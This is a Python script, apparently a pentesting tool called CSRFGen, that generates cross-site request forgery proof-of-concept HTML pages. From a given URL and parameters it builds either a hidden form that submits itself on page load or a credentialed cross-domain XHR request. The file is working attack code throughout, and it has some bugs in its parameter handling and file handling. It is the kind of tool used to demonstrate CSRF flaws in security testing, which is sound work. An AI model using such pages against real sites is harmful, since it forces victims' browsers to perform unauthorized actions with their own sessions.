import argparse, urllib.parse
from yattag import Doc, indent

the_parser = argparse.ArgumentParser(description='This is CSRF PoC generator')
the_parser.add_argument('-m', '--method', help='The request Method [GET] or [POST]')
the_parser.add_argument('-u', '--url', help='The Attacker URL')
the_parser.add_argument('-p', '--parameters', help='The Request Parameters')
the_parser.add_argument('-a', '--author', help='The Author Name')
the_parser.add_argument('-e', '--encrypt', help='The form reqest encryption type [application/x-www-form-urlencoded] or [multipart/form-data] or [text/plain]')
the_parser.add_argument('--xhr', help="This will implement the Cross-domian XHR PoC", action='store_true')

args = the_parser.parse_args()
request_method = None
the_url = None
request_parameters = None
the_author = None
encryption_type = None

def check_params(method, url, params, author = 'The Attacker', encrypt = 'application/x-www-form-urlencoded') -> bool:

    global request_method, the_url, the_parser, request_parameters, the_author, encryption_type

    available_methods_list = ["POST", "GET"]
    available_encryption_types_list = [
            "application/x-www-form-urlencoded",
            "multipart/form-data",
            "text/plain"
        ]

    if method is not None:
        method_argument = method
        method_argument = method_argument.upper()
        if method_argument in available_methods_list:
            request_method = method_argument
        else:
            print("Methods Supported are [GET] and [POST]")
            exit(0)
    else:
        print(the_parser.format_help())
        exit(0)

    if url is not None:
        the_url = url
    else:
        print(the_parser.format_help())
        exit(0)

    if params is not None:
        request_parameters = urllib.parse.unquote(params)
        request_parameters = params_extraction(request_parameters)
    else:
        print(the_parser.format_help())
        exit(0)

    if author is not None:
        the_author = author
    else:
        print(the_parser.format_help())
        exit(0)

    if encrypt is not None:
        if encrypt in available_encryption_types_list:
            encryption_type = encrypt
        else:
            print("Encryption Types Supported are [application/x-www-form-urlencoded] and [multipart/form-data] and [text/plain]")
            exit(0)
    else:
        print(the_parser.format_help())
        exit(0)
        
    return True

def params_extraction(params: str) -> dict:
    results = dict()
    params = params.replace('"', '%22')

    if '&' and '=' in params:
        split_by_and = params.split('&')

        for i in split_by_and:
            split_by_equal = i.split('=')
            if split_by_equal[1] == '':
                split_by_equal[1] = ' '
            results[split_by_equal[0]] = split_by_equal[1]
    else:
        print(the_parser.format_help())
        exit(0)
    
    return results

def create_form(method, url, params, author, encrypt):
    doc, tag, text = Doc().tagtext()
    with tag('html'):
        with tag('title'):
            text('This CSRF was found by ' + author)
        with tag('body'):
            with tag('script'):
                text('history.pushState("", "", "/")')
            with tag('h1'):
                text('This POC was Created By CSRFGen')
            with tag('form', action=url, method=method, enctype=encrypt):
                for name in params:
                    value = params[name]
                    doc.stag('input', type='hidden', name=name, value=value)
            with tag('script'):
                text('document.forms[0].submit();')
    return indent(doc.getvalue(), indent_text=True)

def create_form_with_cross_domain_xhr(method, url, author, encrypt):

    js_script = "function submitRequest() {var xhr = new XMLHttpRequest(); xhr.open('"+ method +"', '" + url + "', true); xhr.setRequestHeader('Content-Type', '" + encrypt + "'); var body = '" + args.parameters + "'; xhr.withCredentials = true; var aBody = new Uint8Array(body.length); for (var i = 0; i < aBody.length; i++) aBody[i] = body.charCodeAt(i); xhr.send(new Blob([aBody]));}"

    doc, tag, text = Doc().tagtext()
    with tag('html'):
        with tag('title'):
            text('This CSRF was found by ' + author)
        with tag('body'):
            with tag('script'):
                text('history.pushState("", "", "/")')
            with tag('script'):
                text(js_script)
            with tag('h1'):
                text('This POC was Created By CSRFGen')
            with tag('form', action="#"):
                doc.stag('input', type='button', value='Submit request', onclick="submitRequest();")
    return indent(doc.getvalue(), indent_text=True)

def main():
    try:
        testing_params = check_params(args.method, args.url, args.parameters, args.author, args.encrypt)
        if args.xhr and testing_params:
            print(create_form_with_cross_domain_xhr(request_method, the_url, the_author, encryption_type))
            with open('results/poc.html', 'w+') as f:
                f.write(create_form_with_cross_domain_xhr(request_method, the_url, the_author, encryption_type))
                f.read()
                f.close()
            print("The PoC file was created in results folder with poc.html name")
        elif testing_params:
            print(create_form(request_method, the_url, request_parameters, the_author, encryption_type))
            with open('results/poc.html', 'w+') as f:
                f.write(create_form(request_method, the_url, request_parameters, the_author, encryption_type))
                f.read()
                f.close()
            print("The PoC file was created in results folder with poc.html name")
        else:
            print(the_parser.format_help())
            exit(0)
    except:
        print("Something Went Wrong :(")
        exit(0)

if __name__ == '__main__':
    main()